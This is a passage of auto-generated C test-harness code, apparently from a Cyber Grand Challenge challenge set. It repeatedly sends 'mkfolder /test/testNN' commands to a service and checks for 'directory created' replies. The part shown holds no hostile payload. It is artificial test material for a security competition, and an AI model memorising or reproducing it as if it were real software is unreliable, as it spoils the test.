         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00068_ptr += cgc_data_match(read_00068 + read_00068_ptr, read_00068_len - read_00068_ptr, match_00068_00000, 18);
      cgc_free(read_00068);
      if (read_00068_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00067_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x35\x0a";
      static unsigned int write_00067_00000_len = 22;
      unsigned char *write_00067 = NULL;
      unsigned int write_00067_len = 0;
      write_00067 = cgc_append_buf(write_00067, &write_00067_len, write_00067_00000, write_00067_00000_len);
      if (write_00067_len > 0) {
         cgc_transmit_all(1, write_00067, write_00067_len);
      }
      cgc_free(write_00067);
   } while (0);
   do {
      unsigned char *read_00069;
      unsigned int read_00069_len;
      unsigned int read_00069_ptr = 0;
      //**** delimited read
      static unsigned char read_00069_delim[] = 
         "\x25\x20";
      read_00069 = NULL;
      read_00069_len = 0;
      int read_00069_res = cgc_delimited_read(0, &read_00069, &read_00069_len, read_00069_delim, 2);
      if (read_00069_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00069_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00069_ptr += cgc_data_match(read_00069 + read_00069_ptr, read_00069_len - read_00069_ptr, match_00069_00000, 18);
      cgc_free(read_00069);
      if (read_00069_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00068_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x36\x0a";
      static unsigned int write_00068_00000_len = 22;
      unsigned char *write_00068 = NULL;
      unsigned int write_00068_len = 0;
      write_00068 = cgc_append_buf(write_00068, &write_00068_len, write_00068_00000, write_00068_00000_len);
      if (write_00068_len > 0) {
         cgc_transmit_all(1, write_00068, write_00068_len);
      }
      cgc_free(write_00068);
   } while (0);
   do {
      unsigned char *read_00070;
      unsigned int read_00070_len;
      unsigned int read_00070_ptr = 0;
      //**** delimited read
      static unsigned char read_00070_delim[] = 
         "\x25\x20";
      read_00070 = NULL;
      read_00070_len = 0;
      int read_00070_res = cgc_delimited_read(0, &read_00070, &read_00070_len, read_00070_delim, 2);
      if (read_00070_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00070_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00070_ptr += cgc_data_match(read_00070 + read_00070_ptr, read_00070_len - read_00070_ptr, match_00070_00000, 18);
      cgc_free(read_00070);
      if (read_00070_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00069_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x37\x0a";
      static unsigned int write_00069_00000_len = 22;
      unsigned char *write_00069 = NULL;
      unsigned int write_00069_len = 0;
      write_00069 = cgc_append_buf(write_00069, &write_00069_len, write_00069_00000, write_00069_00000_len);
      if (write_00069_len > 0) {
         cgc_transmit_all(1, write_00069, write_00069_len);
      }
      cgc_free(write_00069);
   } while (0);
   do {
      unsigned char *read_00071;
      unsigned int read_00071_len;
      unsigned int read_00071_ptr = 0;
      //**** delimited read
      static unsigned char read_00071_delim[] = 
         "\x25\x20";
      read_00071 = NULL;
      read_00071_len = 0;
      int read_00071_res = cgc_delimited_read(0, &read_00071, &read_00071_len, read_00071_delim, 2);
      if (read_00071_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00071_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00071_ptr += cgc_data_match(read_00071 + read_00071_ptr, read_00071_len - read_00071_ptr, match_00071_00000, 18);
      cgc_free(read_00071);
      if (read_00071_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00070_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x38\x0a";
      static unsigned int write_00070_00000_len = 22;
      unsigned char *write_00070 = NULL;
      unsigned int write_00070_len = 0;
      write_00070 = cgc_append_buf(write_00070, &write_00070_len, write_00070_00000, write_00070_00000_len);
      if (write_00070_len > 0) {
         cgc_transmit_all(1, write_00070, write_00070_len);
      }
      cgc_free(write_00070);
   } while (0);
   do {
      unsigned char *read_00072;
      unsigned int read_00072_len;
      unsigned int read_00072_ptr = 0;
      //**** delimited read
      static unsigned char read_00072_delim[] = 
         "\x25\x20";
      read_00072 = NULL;
      read_00072_len = 0;
      int read_00072_res = cgc_delimited_read(0, &read_00072, &read_00072_len, read_00072_delim, 2);
      if (read_00072_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00072_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00072_ptr += cgc_data_match(read_00072 + read_00072_ptr, read_00072_len - read_00072_ptr, match_00072_00000, 18);
      cgc_free(read_00072);
      if (read_00072_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00071_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x36\x39\x0a";
      static unsigned int write_00071_00000_len = 22;
      unsigned char *write_00071 = NULL;
      unsigned int write_00071_len = 0;
      write_00071 = cgc_append_buf(write_00071, &write_00071_len, write_00071_00000, write_00071_00000_len);
      if (write_00071_len > 0) {
         cgc_transmit_all(1, write_00071, write_00071_len);
      }
      cgc_free(write_00071);
   } while (0);
   do {
      unsigned char *read_00073;
      unsigned int read_00073_len;
      unsigned int read_00073_ptr = 0;
      //**** delimited read
      static unsigned char read_00073_delim[] = 
         "\x25\x20";
      read_00073 = NULL;
      read_00073_len = 0;
      int read_00073_res = cgc_delimited_read(0, &read_00073, &read_00073_len, read_00073_delim, 2);
      if (read_00073_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00073_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00073_ptr += cgc_data_match(read_00073 + read_00073_ptr, read_00073_len - read_00073_ptr, match_00073_00000, 18);
      cgc_free(read_00073);
      if (read_00073_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00072_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x30\x0a";
      static unsigned int write_00072_00000_len = 22;
      unsigned char *write_00072 = NULL;
      unsigned int write_00072_len = 0;
      write_00072 = cgc_append_buf(write_00072, &write_00072_len, write_00072_00000, write_00072_00000_len);
      if (write_00072_len > 0) {
         cgc_transmit_all(1, write_00072, write_00072_len);
      }
      cgc_free(write_00072);
   } while (0);
   do {
      unsigned char *read_00074;
      unsigned int read_00074_len;
      unsigned int read_00074_ptr = 0;
      //**** delimited read
      static unsigned char read_00074_delim[] = 
         "\x25\x20";
      read_00074 = NULL;
      read_00074_len = 0;
      int read_00074_res = cgc_delimited_read(0, &read_00074, &read_00074_len, read_00074_delim, 2);
      if (read_00074_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00074_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00074_ptr += cgc_data_match(read_00074 + read_00074_ptr, read_00074_len - read_00074_ptr, match_00074_00000, 18);
      cgc_free(read_00074);
      if (read_00074_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00073_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x31\x0a";
      static unsigned int write_00073_00000_len = 22;
      unsigned char *write_00073 = NULL;
      unsigned int write_00073_len = 0;
      write_00073 = cgc_append_buf(write_00073, &write_00073_len, write_00073_00000, write_00073_00000_len);
      if (write_00073_len > 0) {
         cgc_transmit_all(1, write_00073, write_00073_len);
      }
      cgc_free(write_00073);
   } while (0);
   do {
      unsigned char *read_00075;
      unsigned int read_00075_len;
      unsigned int read_00075_ptr = 0;
      //**** delimited read
      static unsigned char read_00075_delim[] = 
         "\x25\x20";
      read_00075 = NULL;
      read_00075_len = 0;
      int read_00075_res = cgc_delimited_read(0, &read_00075, &read_00075_len, read_00075_delim, 2);
      if (read_00075_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00075_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00075_ptr += cgc_data_match(read_00075 + read_00075_ptr, read_00075_len - read_00075_ptr, match_00075_00000, 18);
      cgc_free(read_00075);
      if (read_00075_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00074_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x32\x0a";
      static unsigned int write_00074_00000_len = 22;
      unsigned char *write_00074 = NULL;
      unsigned int write_00074_len = 0;
      write_00074 = cgc_append_buf(write_00074, &write_00074_len, write_00074_00000, write_00074_00000_len);
      if (write_00074_len > 0) {
         cgc_transmit_all(1, write_00074, write_00074_len);
      }
      cgc_free(write_00074);
   } while (0);
   do {
      unsigned char *read_00076;
      unsigned int read_00076_len;
      unsigned int read_00076_ptr = 0;
      //**** delimited read
      static unsigned char read_00076_delim[] = 
         "\x25\x20";
      read_00076 = NULL;
      read_00076_len = 0;
      int read_00076_res = cgc_delimited_read(0, &read_00076, &read_00076_len, read_00076_delim, 2);
      if (read_00076_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00076_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00076_ptr += cgc_data_match(read_00076 + read_00076_ptr, read_00076_len - read_00076_ptr, match_00076_00000, 18);
      cgc_free(read_00076);
      if (read_00076_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00075_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x33\x0a";
      static unsigned int write_00075_00000_len = 22;
      unsigned char *write_00075 = NULL;
      unsigned int write_00075_len = 0;
      write_00075 = cgc_append_buf(write_00075, &write_00075_len, write_00075_00000, write_00075_00000_len);
      if (write_00075_len > 0) {
         cgc_transmit_all(1, write_00075, write_00075_len);
      }
      cgc_free(write_00075);
   } while (0);
   do {
      unsigned char *read_00077;
      unsigned int read_00077_len;
      unsigned int read_00077_ptr = 0;
      //**** delimited read
      static unsigned char read_00077_delim[] = 
         "\x25\x20";
      read_00077 = NULL;
      read_00077_len = 0;
      int read_00077_res = cgc_delimited_read(0, &read_00077, &read_00077_len, read_00077_delim, 2);
      if (read_00077_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00077_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00077_ptr += cgc_data_match(read_00077 + read_00077_ptr, read_00077_len - read_00077_ptr, match_00077_00000, 18);
      cgc_free(read_00077);
      if (read_00077_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00076_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x34\x0a";
      static unsigned int write_00076_00000_len = 22;
      unsigned char *write_00076 = NULL;
      unsigned int write_00076_len = 0;
      write_00076 = cgc_append_buf(write_00076, &write_00076_len, write_00076_00000, write_00076_00000_len);
      if (write_00076_len > 0) {
         cgc_transmit_all(1, write_00076, write_00076_len);
      }
      cgc_free(write_00076);
   } while (0);
   do {
      unsigned char *read_00078;
      unsigned int read_00078_len;
      unsigned int read_00078_ptr = 0;
      //**** delimited read
      static unsigned char read_00078_delim[] = 
         "\x25\x20";
      read_00078 = NULL;
      read_00078_len = 0;
      int read_00078_res = cgc_delimited_read(0, &read_00078, &read_00078_len, read_00078_delim, 2);
      if (read_00078_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00078_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00078_ptr += cgc_data_match(read_00078 + read_00078_ptr, read_00078_len - read_00078_ptr, match_00078_00000, 18);
      cgc_free(read_00078);
      if (read_00078_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00077_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x35\x0a";
      static unsigned int write_00077_00000_len = 22;
      unsigned char *write_00077 = NULL;
      unsigned int write_00077_len = 0;
      write_00077 = cgc_append_buf(write_00077, &write_00077_len, write_00077_00000, write_00077_00000_len);
      if (write_00077_len > 0) {
         cgc_transmit_all(1, write_00077, write_00077_len);
      }
      cgc_free(write_00077);
   } while (0);
   do {
      unsigned char *read_00079;
      unsigned int read_00079_len;
      unsigned int read_00079_ptr = 0;
      //**** delimited read
      static unsigned char read_00079_delim[] = 
         "\x25\x20";
      read_00079 = NULL;
      read_00079_len = 0;
      int read_00079_res = cgc_delimited_read(0, &read_00079, &read_00079_len, read_00079_delim, 2);
      if (read_00079_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00079_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00079_ptr += cgc_data_match(read_00079 + read_00079_ptr, read_00079_len - read_00079_ptr, match_00079_00000, 18);
      cgc_free(read_00079);
      if (read_00079_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00078_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x36\x0a";
      static unsigned int write_00078_00000_len = 22;
      unsigned char *write_00078 = NULL;
      unsigned int write_00078_len = 0;
      write_00078 = cgc_append_buf(write_00078, &write_00078_len, write_00078_00000, write_00078_00000_len);
      if (write_00078_len > 0) {
         cgc_transmit_all(1, write_00078, write_00078_len);
      }
      cgc_free(write_00078);
   } while (0);
   do {
      unsigned char *read_00080;
      unsigned int read_00080_len;
      unsigned int read_00080_ptr = 0;
      //**** delimited read
      static unsigned char read_00080_delim[] = 
         "\x25\x20";
      read_00080 = NULL;
      read_00080_len = 0;
      int read_00080_res = cgc_delimited_read(0, &read_00080, &read_00080_len, read_00080_delim, 2);
      if (read_00080_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00080_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00080_ptr += cgc_data_match(read_00080 + read_00080_ptr, read_00080_len - read_00080_ptr, match_00080_00000, 18);
      cgc_free(read_00080);
      if (read_00080_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00079_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x37\x0a";
      static unsigned int write_00079_00000_len = 22;
      unsigned char *write_00079 = NULL;
      unsigned int write_00079_len = 0;
      write_00079 = cgc_append_buf(write_00079, &write_00079_len, write_00079_00000, write_00079_00000_len);
      if (write_00079_len > 0) {
         cgc_transmit_all(1, write_00079, write_00079_len);
      }
      cgc_free(write_00079);
   } while (0);
   do {
      unsigned char *read_00081;
      unsigned int read_00081_len;
      unsigned int read_00081_ptr = 0;
      //**** delimited read
      static unsigned char read_00081_delim[] = 
         "\x25\x20";
      read_00081 = NULL;
      read_00081_len = 0;
      int read_00081_res = cgc_delimited_read(0, &read_00081, &read_00081_len, read_00081_delim, 2);
      if (read_00081_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00081_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00081_ptr += cgc_data_match(read_00081 + read_00081_ptr, read_00081_len - read_00081_ptr, match_00081_00000, 18);
      cgc_free(read_00081);
      if (read_00081_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00080_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x38\x0a";
      static unsigned int write_00080_00000_len = 22;
      unsigned char *write_00080 = NULL;
      unsigned int write_00080_len = 0;
      write_00080 = cgc_append_buf(write_00080, &write_00080_len, write_00080_00000, write_00080_00000_len);
      if (write_00080_len > 0) {
         cgc_transmit_all(1, write_00080, write_00080_len);
      }
      cgc_free(write_00080);
   } while (0);
   do {
      unsigned char *read_00082;
      unsigned int read_00082_len;
      unsigned int read_00082_ptr = 0;
      //**** delimited read
      static unsigned char read_00082_delim[] = 
         "\x25\x20";
      read_00082 = NULL;
      read_00082_len = 0;
      int read_00082_res = cgc_delimited_read(0, &read_00082, &read_00082_len, read_00082_delim, 2);
      if (read_00082_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00082_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00082_ptr += cgc_data_match(read_00082 + read_00082_ptr, read_00082_len - read_00082_ptr, match_00082_00000, 18);
      cgc_free(read_00082);
      if (read_00082_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00081_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x37\x39\x0a";
      static unsigned int write_00081_00000_len = 22;
      unsigned char *write_00081 = NULL;
      unsigned int write_00081_len = 0;
      write_00081 = cgc_append_buf(write_00081, &write_00081_len, write_00081_00000, write_00081_00000_len);
      if (write_00081_len > 0) {
         cgc_transmit_all(1, write_00081, write_00081_len);
      }
      cgc_free(write_00081);
   } while (0);
   do {
      unsigned char *read_00083;
      unsigned int read_00083_len;
      unsigned int read_00083_ptr = 0;
      //**** delimited read
      static unsigned char read_00083_delim[] = 
         "\x25\x20";
      read_00083 = NULL;
      read_00083_len = 0;
      int read_00083_res = cgc_delimited_read(0, &read_00083, &read_00083_len, read_00083_delim, 2);
      if (read_00083_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00083_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00083_ptr += cgc_data_match(read_00083 + read_00083_ptr, read_00083_len - read_00083_ptr, match_00083_00000, 18);
      cgc_free(read_00083);
      if (read_00083_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00082_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x30\x0a";
      static unsigned int write_00082_00000_len = 22;
      unsigned char *write_00082 = NULL;
      unsigned int write_00082_len = 0;
      write_00082 = cgc_append_buf(write_00082, &write_00082_len, write_00082_00000, write_00082_00000_len);
      if (write_00082_len > 0) {
         cgc_transmit_all(1, write_00082, write_00082_len);
      }
      cgc_free(write_00082);
   } while (0);
   do {
      unsigned char *read_00084;
      unsigned int read_00084_len;
      unsigned int read_00084_ptr = 0;
      //**** delimited read
      static unsigned char read_00084_delim[] = 
         "\x25\x20";
      read_00084 = NULL;
      read_00084_len = 0;
      int read_00084_res = cgc_delimited_read(0, &read_00084, &read_00084_len, read_00084_delim, 2);
      if (read_00084_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00084_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00084_ptr += cgc_data_match(read_00084 + read_00084_ptr, read_00084_len - read_00084_ptr, match_00084_00000, 18);
      cgc_free(read_00084);
      if (read_00084_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00083_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x31\x0a";
      static unsigned int write_00083_00000_len = 22;
      unsigned char *write_00083 = NULL;
      unsigned int write_00083_len = 0;
      write_00083 = cgc_append_buf(write_00083, &write_00083_len, write_00083_00000, write_00083_00000_len);
      if (write_00083_len > 0) {
         cgc_transmit_all(1, write_00083, write_00083_len);
      }
      cgc_free(write_00083);
   } while (0);
   do {
      unsigned char *read_00085;
      unsigned int read_00085_len;
      unsigned int read_00085_ptr = 0;
      //**** delimited read
      static unsigned char read_00085_delim[] = 
         "\x25\x20";
      read_00085 = NULL;
      read_00085_len = 0;
      int read_00085_res = cgc_delimited_read(0, &read_00085, &read_00085_len, read_00085_delim, 2);
      if (read_00085_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00085_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00085_ptr += cgc_data_match(read_00085 + read_00085_ptr, read_00085_len - read_00085_ptr, match_00085_00000, 18);
      cgc_free(read_00085);
      if (read_00085_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00084_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x32\x0a";
      static unsigned int write_00084_00000_len = 22;
      unsigned char *write_00084 = NULL;
      unsigned int write_00084_len = 0;
      write_00084 = cgc_append_buf(write_00084, &write_00084_len, write_00084_00000, write_00084_00000_len);
      if (write_00084_len > 0) {
         cgc_transmit_all(1, write_00084, write_00084_len);
      }
      cgc_free(write_00084);
   } while (0);
   do {
      unsigned char *read_00086;
      unsigned int read_00086_len;
      unsigned int read_00086_ptr = 0;
      //**** delimited read
      static unsigned char read_00086_delim[] = 
         "\x25\x20";
      read_00086 = NULL;
      read_00086_len = 0;
      int read_00086_res = cgc_delimited_read(0, &read_00086, &read_00086_len, read_00086_delim, 2);
      if (read_00086_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00086_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00086_ptr += cgc_data_match(read_00086 + read_00086_ptr, read_00086_len - read_00086_ptr, match_00086_00000, 18);
      cgc_free(read_00086);
      if (read_00086_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00085_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x33\x0a";
      static unsigned int write_00085_00000_len = 22;
      unsigned char *write_00085 = NULL;
      unsigned int write_00085_len = 0;
      write_00085 = cgc_append_buf(write_00085, &write_00085_len, write_00085_00000, write_00085_00000_len);
      if (write_00085_len > 0) {
         cgc_transmit_all(1, write_00085, write_00085_len);
      }
      cgc_free(write_00085);
   } while (0);
   do {
      unsigned char *read_00087;
      unsigned int read_00087_len;
      unsigned int read_00087_ptr = 0;
      //**** delimited read
      static unsigned char read_00087_delim[] = 
         "\x25\x20";
      read_00087 = NULL;
      read_00087_len = 0;
      int read_00087_res = cgc_delimited_read(0, &read_00087, &read_00087_len, read_00087_delim, 2);
      if (read_00087_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00087_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00087_ptr += cgc_data_match(read_00087 + read_00087_ptr, read_00087_len - read_00087_ptr, match_00087_00000, 18);
      cgc_free(read_00087);
      if (read_00087_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00086_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x34\x0a";
      static unsigned int write_00086_00000_len = 22;
      unsigned char *write_00086 = NULL;
      unsigned int write_00086_len = 0;
      write_00086 = cgc_append_buf(write_00086, &write_00086_len, write_00086_00000, write_00086_00000_len);
      if (write_00086_len > 0) {
         cgc_transmit_all(1, write_00086, write_00086_len);
      }
      cgc_free(write_00086);
   } while (0);
   do {
      unsigned char *read_00088;
      unsigned int read_00088_len;
      unsigned int read_00088_ptr = 0;
      //**** delimited read
      static unsigned char read_00088_delim[] = 
         "\x25\x20";
      read_00088 = NULL;
      read_00088_len = 0;
      int read_00088_res = cgc_delimited_read(0, &read_00088, &read_00088_len, read_00088_delim, 2);
      if (read_00088_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00088_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00088_ptr += cgc_data_match(read_00088 + read_00088_ptr, read_00088_len - read_00088_ptr, match_00088_00000, 18);
      cgc_free(read_00088);
      if (read_00088_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00087_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x35\x0a";
      static unsigned int write_00087_00000_len = 22;
      unsigned char *write_00087 = NULL;
      unsigned int write_00087_len = 0;
      write_00087 = cgc_append_buf(write_00087, &write_00087_len, write_00087_00000, write_00087_00000_len);
      if (write_00087_len > 0) {
         cgc_transmit_all(1, write_00087, write_00087_len);
      }
      cgc_free(write_00087);
   } while (0);
   do {
      unsigned char *read_00089;
      unsigned int read_00089_len;
      unsigned int read_00089_ptr = 0;
      //**** delimited read
      static unsigned char read_00089_delim[] = 
         "\x25\x20";
      read_00089 = NULL;
      read_00089_len = 0;
      int read_00089_res = cgc_delimited_read(0, &read_00089, &read_00089_len, read_00089_delim, 2);
      if (read_00089_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00089_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00089_ptr += cgc_data_match(read_00089 + read_00089_ptr, read_00089_len - read_00089_ptr, match_00089_00000, 18);
      cgc_free(read_00089);
      if (read_00089_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00088_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x36\x0a";
      static unsigned int write_00088_00000_len = 22;
      unsigned char *write_00088 = NULL;
      unsigned int write_00088_len = 0;
      write_00088 = cgc_append_buf(write_00088, &write_00088_len, write_00088_00000, write_00088_00000_len);
      if (write_00088_len > 0) {
         cgc_transmit_all(1, write_00088, write_00088_len);
      }
      cgc_free(write_00088);
   } while (0);
   do {
      unsigned char *read_00090;
      unsigned int read_00090_len;
      unsigned int read_00090_ptr = 0;
      //**** delimited read
      static unsigned char read_00090_delim[] = 
         "\x25\x20";
      read_00090 = NULL;
      read_00090_len = 0;
      int read_00090_res = cgc_delimited_read(0, &read_00090, &read_00090_len, read_00090_delim, 2);
      if (read_00090_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00090_00000[] = 
         "\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x20\x63\x72\x65\x61\x74\x65"
         "\x64\x0a";
      read_00090_ptr += cgc_data_match(read_00090 + read_00090_ptr, read_00090_len - read_00090_ptr, match_00090_00000, 18);
      cgc_free(read_00090);
      if (read_00090_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00089_00000[] = 
         "\x6d\x6b\x66\x6f\x6c\x64\x65\x72\x20\x2f\x74\x65\x73\x74\x2f\x74"
         "\x65\x73\x74\x38\x37\x0a";
      static unsigned int write_00089_00000_len = 22;
      unsigned char *write_00089 = NULL;
      unsigned int write_00089_len = 0;
      write_00089 = cgc_append_buf(write_00089, &write_00089_len, write_00089_00000, write_00089_00000_len);
      if (write_00089_len > 0) {
         cgc_transmit_all(1, write_00089, write_00089_len);
      }
      cgc_free(write_00089);
   } while (0);
   do {
      unsigned char *read_00091;
